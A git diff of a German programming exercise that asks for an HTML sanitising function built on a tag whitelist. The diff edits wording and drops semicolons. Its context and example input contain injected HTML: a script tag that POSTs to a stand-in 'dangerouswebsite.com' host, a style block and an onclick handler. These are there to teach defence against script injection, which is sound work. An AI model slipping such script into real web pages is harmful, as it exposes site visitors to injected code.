@@ -1,6 +1,6 @@
 # Kontext
 
-Bei der Darstellung von User-generiertem HTML auf Websites ist es wichtig, dass unerwünschte oder sogar potenziell gefährliche HTML-Tags nicht gerendert werden. Dadurch kann das Layout der Website verändert oder sogar JavaScript eingeschleust werden:
+Bei der Darstellung von User-generiertem HTML auf Websites ist es wichtig, dass unerwünschte oder sogar potenziell gefährliche HTML-Tags nicht gerendert werden. Ansonsten kann das Layout der Website verändert oder sogar JavaScript eingeschleust werden:
 
 ```html
 <style>
@@ -10,13 +10,13 @@ Bei der Darstellung von User-generiertem HTML auf Websites ist es wichtig, dass 
 </style>
 
 <script>
-	fetch("https://dangerouswebsite.com", { method: "POST" });
+	fetch("https://dangerouswebsite.com", { method: "POST" })
 </script>
 ```
 
 # Aufgabe
 
-Schreibe eine Funktion `sanitize_html(txt)`, welche einen HTML-Text bereinigt.
+Schreibe eine Funktion, welche einen HTML-Text bereinigt.
 
 Erstelle dazu eine Whitelist mit erlaubten, harmlosen Tags wie z. B. `div`, `span`, `p`, `ol`, usw. Diese werden erhalten. Alle anderen Tags werden entfernt bzw. durch den Text darin ersetzt, womit also `<script>XYZ</script>` zu `XYZ` wird.
 
@@ -24,7 +24,7 @@ Außerdem müssen alle Attribute aus den erlaubten Tags entfernt werden, worunte
 
 # Beispiel
 
-Die Funktion soll den Text
+**Eingabe**
 
 ```html
 <h1>Überschrift</h1>
@@ -32,7 +32,7 @@ Die Funktion soll den Text
 <p style="color: red">Paragraph</p>
 
 <script>
-	fetch("https://dangerouswebsite.com", { method: "POST" });
+	fetch("https://dangerouswebsite.com", { method: "POST" })
 </script>
 
 <hr />
@@ -42,7 +42,7 @@ Die Funktion soll den Text
 <div onclick="alert('javascript is running here!')">Klicke mich</div>
 ```
 
-überführen in:
+**Ausgabe**
 
 ```html
 <h1>Überschrift</h1>
